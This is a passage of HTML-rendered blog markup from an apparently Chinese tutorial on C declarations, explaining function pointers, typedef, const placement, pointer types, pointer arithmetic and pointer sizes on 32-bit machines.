class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;55&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;56&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;57&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;58&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;59&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;60&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;61&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;62&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;63&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;64&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;65&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;66&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;67&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;68&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;69&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;70&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;int fun(char,double)函数定义如下：&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int(*pf)(char,double)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;pf=&amp;amp;fun&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;C语言的简写：pf=fun&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;pf(a,8.9)函数调用时的实际操作&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int a[6]数组的定义如下：&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int (*pf)[6]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;pf=&amp;amp;a&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int i=(*pf)[2]//将a[2]的值赋给i&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;有了上面的基础我们可以解释下面的定义&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int* (*a[5])(int, char*); //＃1 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;void (*b[10]) (void (*)()); //＃2 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;doube(*)() (*pa)[9]; //＃3 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;首先是&lt;span class=&quot;comment&quot;&gt;#1：*a[5]是一个五个元素的指针，指针指向函数（int,char*）&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;而这个函数的返回值类型是int型的&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;再次就是&lt;span class=&quot;comment&quot;&gt;#2：*b[10]是一个元素个数为10的数组，每个元素都是一个指针&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;该指针指向一个函数，类型为（void(*)()）【注1】返回值是void型的&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;注1;这个参数有事一个指针，指向一个函数，函数参数为空，返回值void型的&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;最后是&lt;span class=&quot;comment&quot;&gt;#3：pa是一个指针，指针指向一个数组，这个数组有9个元素&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;每个元素都是double(*)()【注2】型的&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;注2：也即是一个指针，指向一个函数函数参数为空，返回值是double&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;现在是不是觉得要认识它们是易如反掌，工欲善其事，必先利其器！我们对这种&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;表达方式熟悉之后，就可以用“typedef”来简化这种类型声明。 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;＃1：int* (*a[5])(int, char*); &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;typedef int* (*PF)(int, char*);//PF是一个类型别名【注3】。 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;PF a[5];//跟int* (*a[5])(int, char*);的效果一样！ &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;注 3：很多初学者只知道typedef char* pchar；但是对于typedef的其它用法不&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;太了解。Stephen Blaha对typedef用法做过一个总结：“建立一个类型别名的方&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;法很简单，在传统的变量声明表达式里用类型名替代变量名，然后把关键字&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; typedef加在该语句的开头”。 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;＃2：void (*b[10]) (void (*)()); &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;typedef void (*pfv)(); &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;typedef void (*pf_taking_pfv)(pfv); &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;pf_taking_pfv b[10]; //跟void (*b[10]) (void (*)());的效果一样！ &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;＃3. doube(*)() (*pa)[9]; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;typedef double(*PF)(); &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;typedef PF (*PA)[9]; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;PA pa; //跟doube(*)() (*pa)[9];的效果一样！ &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3.const和volatile在类型声明中的位置 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;在这里我只说const，volatile是一样的【注4】！ &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;注4：顾名思义，volatile修饰的量就是很容易变化，不稳定的量&lt;span class=&quot;string&quot;&gt;&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;它可能被其它线程，操作系统，硬件等等在未知的时间改变，所以&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;它被存储在内存中，每次取用它的时候都只能在内存中去读取，它&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;不能被编译器优化放在内部寄存器中。 &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;类型声明中const用来修饰一个常量，我们一般这样使用：const在前面 &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;const int；//int是const &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;const char*;//char是const &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;char* const;//*（指针）是const &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;const char* const;//char和*都是const &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;对初学者，const char*;和 char* const;是容易混淆的。这需要时间&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;的历练让你习惯它。 &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;上面的声明有一个对等的写法：const在后面 &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;int const；//int是const &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;char const*;//char是const &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;char* const;//*（指针）是const &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;char const* const;//char和*都是const &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;第一次你可能不会习惯，但新事物如果是好的，我们为什么要拒绝它呢？：）&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;const在后面有两个好处： &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;A． const所修饰的类型是正好在它前面的那一个。如果这个好处还不能让你&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;动心的话，那请看下一个！ &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;B．我们很多时候会用到typedef的类型别名定义。比如typedef char* pchar&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;，如果用const来修饰的话，当const在前面的时候，就是const pchar，你会&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;以为它就是const char* ，但是你错了，它的真实含义是char* const。是不&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;是让你大吃一惊！但如果你采用const在后面的写法，意义就怎么也不会变，&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;不信你试试！ &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;不过，在真实项目中的命名一致性更重要。你应该在两种情况下都能适应，并&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;能自如的转换，公司习惯，商业利润不论在什么时候都应该优先考虑！不过在&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;开始一个新项目的时候，你可以考虑优先使用const在后面的习惯用法。&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;指针&quot;&gt;&lt;a href=&quot;#指针&quot; class=&quot;headerlink&quot; title=&quot;指针&quot;&gt;&lt;/a&gt;指针&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;55&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;56&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;57&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;58&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;59&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;60&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;61&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;62&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;63&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;64&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;65&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;66&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;67&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;68&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;69&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;70&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;71&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;72&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;73&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;74&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;75&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;76&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;77&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;78&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;79&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;80&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;81&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;82&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;83&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;84&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;85&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;86&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;87&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;88&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;89&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;90&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;91&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;它的本质是地址的类型。在许多语言中根本就没有这个概念。但是它却正是C&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;灵活，高效，在面向过程的时代所向披靡的原因所在。因为C的内存模型基本上&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;对应了现在von Neumann（冯·诺伊曼）计算机的机器模型，很好的达到了对机&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;器的映射。不过有些人似乎永远也不能理解指针【注5】。 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;注5：Joel Spolsky就是这样认为的，他认为对指针的理解是一种aptitude，不&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;是通过训练就可以达到的 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;指针可以指向值、数组、函数，当然它也可以作为值使用。 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;看下面的几个例子： &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int* p;//p是一个指针，指向一个整数 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int** p;//p是一个指针，它指向第二个指针，然后指向一个整数 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int (*pa)[3];//pa是一个指针，指向一个拥有3个整数的数组 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int (*pf)();//pf是一个指向函数的指针，这个函数返回一个整数 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;后面第四节我会详细讲解标识符（identifier）类型的识别。 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;1.指针本身的类型是什么？ &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;先看下面的例子：int a;//a的类型是什么？ &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;对，把a去掉就可以了。因此上面的4个声明语句中的指针本身的类型为： &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int* &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int** &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int (*)[3] &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int (*)() &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;它们都是复合类型，也就是类型与类型结合而成的类型。意义分别如下： &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;point to int（指向一个整数的指针） &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;pointer to pointer to int（指向一个指向整数的指针的指针） &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;pointer to array of 3 ints（指向一个拥有三个整数的数组的指针） &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;pointer to &lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; of parameter is void and &lt;span class=&quot;built_in&quot;&gt;return&lt;/span&gt; value is int &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;（指向一个函数的指针，这个函数参数为空，返回值为整数） &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2.指针所指物的类型是什么？ &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;很简单，指针本身的类型去掉 “*”号就可以了，分别如下： &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int* &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int ()[3] &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int ()() &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3和4有点怪，不是吗？请擦亮你的眼睛，在那个用来把“*”号包住的“()”&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;是多余的，所以： &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int ()[3]就是int [3]（一个拥有三个整数的数组） &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int ()()就是int ()（一个函数，参数为空，返回值为整数）【注6】 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;注6：一个小小的提醒，第二个“()”是一个运算符，名字叫函数调用运算&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;符（&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; call operator）。 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3.指针的算术运算。 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;请再次记住：指针不是一个简单的类型，它是一个和指针所指物的类型复合&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;的类型。因此，它的算术运算与之（指针所指物的类型）密切相关。 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int a[8]; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int* p = a; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int* q = p + 3; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;p++; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;指针的加减并不是指针本身的表示加减，要记住，指针是一个元素的地址，&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;它每加一次，就指向下一个元素。所以： &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;int* q = p + 3;//q指向从p开始的第三个整数。 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;p++;//p指向下一个整数。 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;double* pd; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;……//某些计算之后 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;double* pother = pd – 2;//pother指向从pd倒数第二个double数。 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4.指针本身的大小。 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;在一个现代典型的32位机器上【注7】，机器的内存模型大概是这样的，想&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;象一下，内存空间就像一个连续的房间群。每一个房间的大小是一个字节&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;（一般是黑客动画吧8位）。有些东西大小是一个字节（比如char），一个&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;房间就把它给安置了；但有些东西大小是几个字节（比如double就是8个字&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;节，int就是4 个字节，我说的是典型的32位），所以它就需要几个房间才&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;能安置。 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;注7：什么叫32位？就是机器CPU一次处理的数据宽度是32位，机器的寄存&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;器容量是32位，机器的数据，内存地址总线是32位。当然还有一些细节，&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;但大致就是这样。16位，64位，128位可以以此类推。 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;这些房间都应该有编号（也就是地址），32位的机器内存地址空间当然也&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;是32位，所以房间的每一个编号都用32位的数来编码【注8】。请记住指针&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;也可以作为值使用，作为值的时候，它也必须被安置在房间中（存储在内存&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;中），那么指向一个值的指针需要一个地址大小来存储，即32位，4个字节，&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4个房间来存储。 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;注8：在我们平常用到的32位机器上，绝少有将32位真实内存地址空间全用完&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;的（232 ＝ 4G），即使是服务器也不例外。现代的操作系统一般会实现32位&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;的虚拟地址空间，这样可以方便运用程序的编制。关于虚拟地址（线性地址）&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;和真实地址的区别以及实现，可以参考《Linux源代码情景分析》的第二章存&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;储管理，在互联网上关于这个主题的文章汗牛充栋，&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;，指向对象成员的指针的大小没有定值，但都是4的倍数。不同的编译器还有&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;不同的值。对于一般的普通类（class），指向对象成员的指针大小一般为4，&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;但在引入多重虚拟继承以及虚拟函数的时候，指向对象成员的指针会增大，&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;不论是指向成员数据，还是成员函数。【注9】。 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;注9：在Andrei Alexandrescu的《Modern C++ Design》的5.13节Page124中提到&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;，成员函数指针实际上是带标记的（tagged）unions，它们可以对付多重虚拟继&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;承以及虚拟函数，书上说成员函数指针大小是16，但我的实践告诉我这个结果不&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;对，而且具体编译器实现也不同。一直很想看看GCC的源代码，但由于旁骛太多&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;，而且心不静，本身难度也比较高（这个倒是不害怕^_^），只有留待以后了。 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;还有一点，对一个类的static member来说，指向它的指针只是普通的函数指针，&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;不是pointer to class member，所以它的大小是4。 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5.指针运算符&amp;amp;和* &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;它们是一对相反的操作，&amp;amp;取得一个东西的地址（也就是指针），*得到一个地址&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;里放的东西。这个东西可以是值（对象）、函数、数组、类成员（class member）。 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;其实很简单，房间里面居住着一个人，&amp;amp;操作只能针对人，取得房间号码； &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;*操作只能针对房间，取得房间里的人。 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;参照指针本身的类型以及指针所指物的类型很好理解。 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;小结：其实你只要真正理解了1，2，就相当于掌握了指针的牛鼻子。后面的就不&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;难了，指针的各种变化和C语言中其它普通类型的变化都差不多(比如各种转型)。&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;参数可变的函数&quot;&gt;&lt;a href=&quot;#参数可变的函数&quot; class=&quot;headerlink&quot; title=&quot;参数可变的函数&quot;&gt;&lt;/a&gt;参数可变的函数&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div 